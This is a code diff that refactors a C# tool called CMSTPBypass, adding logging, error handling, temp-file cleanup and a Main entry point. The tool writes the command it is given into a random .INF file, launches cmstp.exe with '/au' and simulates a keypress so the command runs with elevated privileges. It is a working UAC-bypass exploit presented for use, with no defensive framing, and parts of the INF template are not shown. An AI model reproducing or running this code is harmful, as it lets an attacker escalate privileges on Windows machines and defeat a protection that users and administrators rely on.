@@ -1,13 +1,12 @@
 using System;
-using System.Text;
 using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using Microsoft.Extensions.Logging;
 
 public class CMSTPBypass
 {
-    // Our .INF file template!
-    public static string InfTemplate = @"[version]
+    private const string InfTemplate = @"[version]
 Signature=$chicago$
 AdvancedINF=2.5
 
@@ -28,55 +27,104 @@ taskkill /IM cmstp.exe /F
 
 [Strings]
 ServiceName=""CorpVPN""
-ShortSvcName=""CorpVPN""
+ShortSvcName=""CorpVPN""";
 
-";
+    [DllImport("user32.dll")] 
+    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern bool SetForegroundWindow(IntPtr hWnd);
 
-    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
+    private static readonly string BinaryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");
 
-    /* Generates a random named .inf file with command to be executed with UAC privileges */
-    public static string GenerateInfFile(string commandToExecute)
+    private readonly ILogger<CMSTPBypass> _logger;
+
+    public CMSTPBypass(ILogger<CMSTPBypass> logger)
     {
-        string randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
-        string tempDirectory = Path.GetTempPath();
-        string outputFile = Path.Combine(tempDirectory, $"{randomFileName}.inf");
-        string infContent = InfTemplate.Replace("REPLACE_COMMAND_LINE", commandToExecute);
-        File.WriteAllText(outputFile, infContent);
-        return outputFile;
+        _logger = logger;
     }
 
-    public static bool Execute(string commandToExecute)
+    public bool Execute(string commandToExecute)
     {
         if (!File.Exists(BinaryPath))
         {
-            Console.WriteLine("Could not find cmstp.exe binary!");
+            _logger.LogError("Could not find cmstp.exe binary!");
             return false;
         }
 
         string infFile = GenerateInfFile(commandToExecute);
-        Console.WriteLine("Payload file written to " + infFile);
+        _logger.LogInformation("Payload file written to {InfFile}", infFile);
 
-        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
-        startInfo.Arguments = "/au " + infFile;
-        startInfo.UseShellExecute = false;
-        Process process = Process.Start(startInfo);
-
-        process.WaitForInputIdle();
-        IntPtr windowHandle = process.MainWindowHandle;
-        SetForegroundWindow(windowHandle);
-        ShowWindow(windowHandle, 5);
-
-        using (StreamWriter writer = process.StandardInput)
+        try
         {
-            if (writer != null)
-            {
-                writer.WriteLine();
-            }
-        }
+            using Process process = new Process();
+            process.StartInfo.FileName = BinaryPath;
+            process.StartInfo.Arguments = "/au " + infFile;
+            process.StartInfo.UseShellExecute = false;
+            process.Start();
 
-        return true;
+            process.WaitForInputIdle();
+            IntPtr windowHandle = process.MainWindowHandle;
+            SetForegroundWindow(windowHandle);
+            ShowWindow(windowHandle, 5);
+
+            using (StreamWriter writer = process.StandardInput)
+            {
+                if (writer != null)
+                {
+                    writer.WriteLine();
+                }
+            }
+
+            process.WaitForExit();
+            return process.ExitCode == 0;
+        }
+        catch (Exception ex)
+        {
+            _logger.LogError(ex, "An error occurred while executing the command.");
+            return false;
+        }
+        finally
+        {
+            // Clean up the INF file
+            File.Delete(infFile);
+        }
+    }
+
+    private string GenerateInfFile(string commandToExecute)
+    {
+        string randomFileName = Path.GetRandomFileName().Split('.')[0];
+        string tempDirectory = Path.GetTempPath();
+        string infFile = Path.Combine(tempDirectory, $"{randomFileName}.inf");
+        string infContent = InfTemplate.Replace("REPLACE_COMMAND_LINE", commandToExecute);
+        File.WriteAllText(infFile, infContent);
+        return infFile;
+    }
+}
+
+class Program
+{
+    static void Main(string[] args)
+    {
+        ILoggerFactory loggerFactory = LoggerFactory.Create(builder =>
+        {
+            builder.AddConsole();
+        });
+
+        ILogger<CMSTPBypass> logger = loggerFactory.CreateLogger<CMSTPBypass>();
+
+        CMSTPBypass bypass = new CMSTPBypass(logger);
+        string commandToExecute = "Your command here";
+
+        bool success = bypass.Execute(commandToExecute);
+
+        if (success)
+        {
+            Console.WriteLine("Command executed successfully.");
+        }
+        else
+        {
+            Console.WriteLine("Command execution failed.");
+        }
     }
 }
